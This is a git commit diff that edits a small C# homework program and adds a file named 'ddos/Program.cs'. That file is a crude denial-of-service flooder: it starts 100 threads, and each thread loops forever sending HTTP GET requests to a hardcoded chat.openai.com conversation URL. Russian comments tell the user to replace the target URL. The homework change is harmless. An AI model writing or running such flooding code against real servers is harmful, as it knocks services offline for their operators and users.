fccae28b53cc74025fed16817c7e5b3275a7eab4
AkramjonA <akramzonabduvahobov6@gmail.com>
2024-02-20 20:49:53 +0500

    new

--- Home_work/Program.cs
+++ Home_work/Program.cs
@@ -3,8 +3,17 @@
     internal class Program
     {
         static void Main(string[] args)
-        { 
+        {
+            List<int> numbers = new List<int> { 1, 2, 3, 4,5, 6, 7, 8, 9, 10 };
+            int i = 0;
+
+            var res = numbers.Where(x => { i ++; return i >= 4 && i <= 6; }).ToList();
+
+            foreach (int x in res)
+            {
+                Console.WriteLine(x);
+            }
 
         }
-    }
+    }           
 }
---
+++ ddos/Program.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Threading;
+namespace ddos
+{
+    internal class Program
+    {
+        static async Task SendRequest()
+        {
+            try
+            {
+                // Замените "TARGET_URL" на URL целевого сервера
+                string url = "https://chat.openai.com/c/fb400a2a-cd95-44c8-ae80-1f302bdfe8cf";
+                HttpClient client = new HttpClient();
+                HttpResponseMessage response = await client.GetAsync(url);
+                Console.WriteLine("Request sent!");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Error: " + e.Message);
+            }
+        }
+
+        // Количество потоков для параллельной отправки запросов
+        const int NUM_THREADS = 100;
+
+        static void Main(string[] args)
+        {
+            // Создание и запуск потоков
+            Thread[] threads = new Thread[NUM_THREADS];
+            for (int i = 0; i < NUM_THREADS; i++)
+            {
+                Thread thread = new Thread(() => {
+                    while (true)
+                    {
+                        SendRequest().Wait();
+                    }
+                });
+                thread.Start();
+                threads[i] = thread;
+            }
+
+            // Ожидание завершения всех потоков
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+        }
+    }
+}
